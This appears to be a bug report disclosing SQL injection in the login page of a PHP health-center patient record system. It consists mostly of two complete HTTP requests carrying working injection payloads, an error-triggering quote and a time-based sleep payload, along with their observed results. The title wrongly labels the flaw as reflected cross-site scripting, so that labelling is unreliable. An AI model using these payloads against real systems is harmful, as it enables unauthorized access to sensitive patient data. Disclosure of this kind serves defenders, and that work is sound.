# Health Center Patient Record Management System v1.0 has Cross-site scripting (reflected)

BUG_Author: wangte

Website source address:https://www.sourcecodester.com/php/11058/health-center-patient-record-management-system.html

Vulnerability File: /HCPMS/login.php

form-data parameter name="username" (POST), exists SQL injection vulnerability

Payload1:a'

```
POST /HCPMS/login.php HTTP/1.1
Host: localhost
Content-Length: 329
Cache-Control: max-age=0
sec-ch-ua: "Chromium";v="97", " Not;A Brand";v="99"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Upgrade-Insecure-Requests: 1
Origin: http://localhost
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryx9y4jGcydZgVeJEQ
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: http://localhost/HCPMS/
Accept-Encoding: gzip, deflate
Accept-Language: en,zh-CN;q=0.9,zh;q=0.8
Cookie: PHPSESSID=6fcav63hl60icb4n7tsvv0ns5k
Connection: close

------WebKitFormBoundaryx9y4jGcydZgVeJEQ
Content-Disposition: form-data; name="username"

a'
------WebKitFormBoundaryx9y4jGcydZgVeJEQ
Content-Disposition: form-data; name="password"

b
------WebKitFormBoundaryx9y4jGcydZgVeJEQ
Content-Disposition: form-data; name="login"


------WebKitFormBoundaryx9y4jGcydZgVeJEQ--

```

An error occurred in the sql statement

![image](https://github.com/2689469248/bug_report/blob/main/pictures/sql1.png)

Payload2:a'+(select*from(select(sleep(20)))a)+'

```
POST /HCPMS/login.php HTTP/1.1
Host: localhost
Content-Length: 365
Cache-Control: max-age=0
sec-ch-ua: "Chromium";v="97", " Not;A Brand";v="99"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Upgrade-Insecure-Requests: 1
Origin: http://localhost
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryx9y4jGcydZgVeJEQ
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: http://localhost/HCPMS/
Accept-Encoding: gzip, deflate
Accept-Language: en,zh-CN;q=0.9,zh;q=0.8
Cookie: PHPSESSID=6fcav63hl60icb4n7tsvv0ns5k
Connection: close

------WebKitFormBoundaryx9y4jGcydZgVeJEQ
Content-Disposition: form-data; name="username"

a'+(select*from(select(sleep(20)))a)+'
------WebKitFormBoundaryx9y4jGcydZgVeJEQ
Content-Disposition: form-data; name="password"

b
------WebKitFormBoundaryx9y4jGcydZgVeJEQ
Content-Disposition: form-data; name="login"


------WebKitFormBoundaryx9y4jGcydZgVeJEQ--

```

The server's response time is 20 seconds

![image](https://github.com/2689469248/bug_report/blob/main/pictures/sql2.png)

